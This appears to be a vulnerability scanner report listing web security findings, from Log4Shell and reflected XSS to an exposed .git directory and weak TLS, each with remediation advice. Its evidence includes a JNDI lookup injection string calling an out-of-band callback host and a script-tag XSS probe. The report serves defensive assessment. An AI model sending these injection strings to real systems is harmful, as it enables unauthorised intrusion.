findings.name: Apache Log4j RCE (CVE-2021-44228)
findings.matcher-output:
HTTP/1.1 200 OK
Content-Type: text/html

[dns callback confirmed] jndi:ldap://oast.example.com:80/a received from 93.184.216.36 — log4shell confirmed via DNS OOB interaction. Request: GET /search?q=${jndi:ldap://oast.example.com:80/a} HTTP/1.1
findings.recommendation: Immediately upgrade log4j to version 2.17.1 or later. Apply the mitigation workaround log4j2.formatMsgNoLookups=true as a temporary fix. Audit all Java applications using the log4j library.

findings.name: Apache Log4j RCE (CVE-2021-44228)
findings.matcher-output: Second nuclei scan pass — duplicate detection. Same finding as above.
findings.recommendation: Immediately upgrade log4j to version 2.17.1 or later.

findings.name: PHP-FPM Status Page Exposed
findings.matcher-output:
HTTP/1.1 200 OK
Content-Type: text/plain

pool: www
process manager: dynamic
start time: 21/May/2026:08:00:00 +0000
start since: 9000
accepted conn: 412301
listen queue: 0
max listen queue: 128
active processes: 4
findings.recommendation: Restrict access to /status and /ping endpoints to internal IPs only. Remove these endpoints from production configurations.

findings.name: Reflected Cross-Site Scripting
findings.matcher-output:
HTTP/1.1 200 OK
Content-Type: text/html

<html><body>Search results for: <script>alert(1)</script> — unencoded user input reflected in response body. Parameter: q. Payload: <script>alert(1)</script>
findings.recommendation: Encode all user-supplied input before reflecting it in HTML output. Implement a Content Security Policy (CSP) header. Use a template engine with automatic escaping.

findings.name: Apache Directory Listing Enabled
findings.matcher-output:
HTTP/1.1 200 OK Content-Type: text/html Index of /uploads/

Index of /uploads/

  • backup-2026.tar.gz
  • config.bak
findings.recommendation: Disable directory listing in Apache with 'Options -Indexes'. Ensure backup files are stored outside the webroot.

findings.name: Exposed .git Directory
findings.matcher-output:
HTTP/1.1 200 OK
Content-Type: text/plain

ref: refs/heads/main
findings.recommendation: Block access to /.git via web server configuration. Remove the .git directory from web-accessible directories entirely. Rotate any secrets that may have been committed to git history.

findings.name: Weak TLS Cipher Suite Accepted
findings.matcher-output: TLS handshake — server accepted: TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 vulnerable). Protocol: TLSv1.2.
findings.recommendation: Disable 3DES cipher suites. Configure TLS to accept only strong ciphers: ECDHE-RSA-AES256-GCM-SHA384 and ECDHE-RSA-AES128-GCM-SHA256. Enable TLSv1.3.

findings.name: Missing Security Headers
findings.matcher-output:
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html

[headers absent] X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy
findings.recommendation: Add security headers: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin. Consider Content-Security-Policy.

findings.name: Express.js Version Disclosure
findings.recommendation: Remove X-Powered-By header in Express: app.disable('x-powered-by')
